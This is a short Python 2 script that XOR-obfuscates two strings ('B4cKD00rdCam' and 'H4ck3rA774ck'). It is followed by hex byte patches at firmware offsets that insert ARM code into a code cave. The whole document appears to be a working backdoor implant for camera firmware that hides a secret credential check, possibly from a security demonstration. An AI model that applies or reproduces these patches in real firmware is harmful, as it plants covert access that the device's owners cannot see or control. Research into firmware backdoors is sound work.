'''
Used to calculate the xor'ed parameters
'''


import struct
param = "\0\0\0\0B4cKD00rdCam"
key = 0x22F23A77

out = ""
for i in range(len(param)-4,-1,-4):
    out += struct.pack('<I',struct.unpack('<I',param[i:i+4])[0]^key)
print out.encode('hex')

val = "H4ck3rA774ck"

out = ""
for c in val:
    out += chr(ord(c)^0x55)
print out.encode('hex')

'''
Below is the patches to the original firmaware to a codecave
'''

#149A0: 00 00 00 00
#15404: EB 31 00 EB
#21BB8: 0D C0 A0 E1 F0 D8 2D E9 04 B0 4C E2 00 40 A0 E3 68 50 9F E5 68 60 9F E5 04 40 2D E5 00 40 95 E5 06 40 24 E0 04 50 85 E2 04 40 2D E5 00 00 54 E3 F9 FF FF 1A 0D 00 A0 E1 48 40 9F E5 34 FF 2F E1 00 60 A0 E1 40 50 9F E5 00 40 D6 E5 00 00 D5 E5 55 40 24 E2 00 40 24 E0 00 00 54 E3 05 00 00 1A 01 60 86 E2 01 50 85 E2 00 00 50 E3 F5 FF FF 1A 01 00 A0 E3 00 00 00 EA 00 00 A0 E3 F0 A8 1B E9 48 1C 02 00 77 3A F2 22 70 41 01 00 58 1C 02 00 13 79 93 4F 33 0A C2 50 35 0E 91 69 77 3A F2 22 1D 61 36 3E 66 27 14 62 62 61 36 3E 00 00 00 00
